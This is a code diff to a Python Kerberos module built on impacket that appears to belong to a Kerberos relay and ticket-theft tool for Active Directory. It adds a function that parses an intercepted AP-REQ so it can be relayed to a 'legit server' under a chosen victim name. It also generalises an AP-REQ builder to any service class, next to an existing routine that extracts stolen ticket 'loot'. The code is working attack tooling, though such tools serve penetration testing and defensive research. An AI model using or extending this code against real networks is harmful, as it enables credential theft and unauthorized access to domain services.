@@ -22,6 +22,36 @@ from impacket.krb5 import constants
 from impacket.krb5.kerberosv5 import getKerberosTGS
 from Cryptodome.Hash import HMAC, MD4
 
+def get_auth_data(token, options):
+    # Do we have a Krb ticket?
+    blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
+    data = blob['innerContextToken']['negTokenInit']['mechToken']
+    try:
+        payload = decoder.decode(data, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
+    except PyAsn1Error:
+        raise Exception('Error obtaining Kerberos data')
+    # If so, assume all is fine and we can just pass this on to the legit server
+    # we just need to get the correct target name
+    apreq = payload['apReq']
+
+    # Get ticket data
+    domain = str(apreq['ticket']['realm']).lower()
+    # Assume this is NT_SRV_INST with 2 labels (not sure this is always the case)
+    sname = '/'.join([str(item) for item in apreq['ticket']['sname']['name-string']])
+
+    # We dont actually know the client name, either use unknown$ or use the user specified
+    if options.victim:
+        username = options.victim
+    else:
+        username = "unknown$"
+    return {
+        "domain": domain,
+        "username": username,
+        "krbauth": token,
+        "service": sname,
+        "apreq": apreq
+    }
+
 def get_kerberos_loot(token, options):
     from pyasn1 import debug
     # debug.setLogger(debug.Debug('all'))
@@ -173,11 +203,9 @@ def get_kerberos_loot(token, options):
     # print plainText
     # Now we got the EncKrbCredPart
     enc_part = decoder.decode(plainText, asn1Spec=EncKrbCredPart())[0]
-    # print enc_part
 
     for i, tinfo in enumerate(enc_part['ticket-info']):
         # This is what we are after :)
-        # uname = Principal(ticket['pname']['name-string'][0])
         username = '/'.join([str(item) for item in tinfo['pname']['name-string']])
         realm = str(tinfo['prealm'])
         fullname = '%s@%s' % (username, realm)
@@ -231,12 +259,22 @@ def ccache2kirbi(ccachefile, kirbifile):
     ccache = KrbCredCCache.loadFile(ccachefile)
     ### TODO from here ###
 
-def ldap_kerberos(domain, kdc, tgt, username, ldapconnection, hostname):
+def ldap_kerberos_auth(ldapconnection, authdata_gssapi):
     # Hackery to authenticate with ldap3 using impacket Kerberos stack
     # I originally wrote this for BloodHound.py, but it works fine (tm) here too
+    ldapconnection.open(read_server_info=False)
+    request = bind_operation(ldapconnection.version, SASL, None, None, ldapconnection.sasl_mechanism, authdata_gssapi)
+    response = ldapconnection.post_send_single_response(ldapconnection.send('bindRequest', request, None))[0]
+    ldapconnection.result = response
+    if response['result'] == 0:
+        ldapconnection.bound = True
+        ldapconnection.refresh_server_info()
+    return response['result'] == 0
 
+def build_apreq(domain, kdc, tgt, username, serviceclass, hostname):
+    # Build a protocol agnostic AP-REQ using the TGT we have, wrapped in GSSAPI/SPNEGO
     username = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-    servername = Principal('ldap/%s' % hostname, type=constants.PrincipalNameType.NT_SRV_INST.value)
+    servername = Principal('%s/%s' % (serviceclass, hostname), type=constants.PrincipalNameType.NT_SRV_INST.value)
     tgs, cipher, _, sessionkey = getKerberosTGS(servername, domain, kdc,
                                                             tgt['KDC_REP'], tgt['cipher'], tgt['sessionKey'])
 
@@ -282,15 +320,11 @@ def ldap_kerberos(domain, kdc, tgt, username, ldapconnection, hostname):
     apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
     blob['MechToken'] = encoder.encode(apReq)
+    return blob.getData()
 
-    # From here back to ldap3
-    ldapconnection.open(read_server_info=False)
-    request = bind_operation(ldapconnection.version, SASL, None, None, ldapconnection.sasl_mechanism, blob.getData())
-    response = ldapconnection.post_send_single_response(ldapconnection.send('bindRequest', request, None))[0]
-    ldapconnection.result = response
-    if response['result'] == 0:
-        ldapconnection.bound = True
-        ldapconnection.refresh_server_info()
-    return response['result'] == 0
+def ldap_kerberos(domain, kdc, tgt, username, ldapconnection, hostname):
+    gssapi_data = build_apreq(domain, kdc, tgt, username, 'ldap', hostname)
+
+    return ldap_kerberos_auth(ldapconnection, gssapi_data)
 
 
